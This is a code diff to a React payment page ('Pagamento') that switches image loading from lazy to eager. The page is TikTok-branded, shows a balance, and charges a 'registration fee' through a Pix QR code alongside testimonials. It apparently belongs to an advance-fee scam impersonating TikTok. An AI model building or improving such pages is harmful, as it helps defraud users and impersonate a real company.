@@ -109,7 +109,7 @@ const Pagamento = () => {
         </div>
         <div className="px-4 py-6 space-y-5 max-w-md mx-auto w-full">
           <div className="flex justify-center">
-            <img src={tiktokLogo} alt="TikTok" className="h-8" loading="lazy" decoding="async" />
+            <img src={tiktokLogo} alt="TikTok" className="h-8" loading="eager" decoding="async" />
           </div>
 
           <div className="rounded-2xl bg-white border border-gray-200 p-6 text-center space-y-4">
@@ -123,7 +123,7 @@ const Pagamento = () => {
                   src={pixData.qr_code_base64}
                   alt="QR Code PIX"
                   className="w-48 h-48 rounded-xl"
-                  loading="lazy"
+                  loading="eager"
                   decoding="async"
                 />
               </div>
@@ -170,7 +170,7 @@ const Pagamento = () => {
       <div className="px-4 py-6 space-y-5">
         {/* Header with logo and saldo */}
         <div className="flex items-center justify-between">
-          <img src={tiktokLogo} alt="TikTok" className="h-8" loading="lazy" decoding="async" />
+          <img src={tiktokLogo} alt="TikTok" className="h-8" loading="eager" decoding="async" />
           <div className="rounded-full border-2 border-secondary px-4 py-1.5">
             <p className="text-[10px] text-gray-400 leading-none">Saldo:</p>
             <p className="text-sm font-bold text-black">R$ {SALDO.toFixed(2).replace(".", ",")}</p>
@@ -187,7 +187,7 @@ const Pagamento = () => {
         <div className="rounded-2xl bg-white border border-gray-200 p-5">
           <div className="flex items-center gap-4 mb-4">
             <div className="h-14 w-14 rounded-2xl overflow-hidden shrink-0">
-              <img src={tiktokRound} alt="TikTok" className="h-full w-full object-cover" loading="lazy" decoding="async" />
+              <img src={tiktokRound} alt="TikTok" className="h-full w-full object-cover" loading="eager" decoding="async" />
             </div>
             <div>
               <p className="text-sm font-bold text-black">Taxa De Cadastro</p>
@@ -233,7 +233,7 @@ const Pagamento = () => {
           <h3 className="text-xl font-bold text-black mb-4">Escolha um método de pagamento...</h3>
           <div className="flex items-center justify-between">
             <div className="flex items-center gap-3">
-              <img src={pixLogo3} alt="Pix" className="h-6 w-6" loading="lazy" decoding="async" />
+              <img src={pixLogo3} alt="Pix" className="h-6 w-6" loading="eager" decoding="async" />
               <div>
                 <p className="text-sm font-bold text-black">Pagamento via Pix</p>
                 <p className="text-xs text-gray-400">Aprovação imediata.</p>
@@ -268,7 +268,7 @@ const Pagamento = () => {
             <div key={t.name} className="min-w-[260px] rounded-2xl bg-white border border-gray-200 p-4">
               <div className="flex items-center gap-3 mb-2">
                 <div className="h-10 w-10 rounded-full overflow-hidden shrink-0">
-                  <img src={t.avatar} alt={t.name} className="h-full w-full object-cover" loading="lazy" decoding="async" />
+                  <img src={t.avatar} alt={t.name} className="h-full w-full object-cover" loading="eager" decoding="async" />
                 </div>
                 <div>
                   <p className="text-sm font-bold text-black">{t.name}</p>
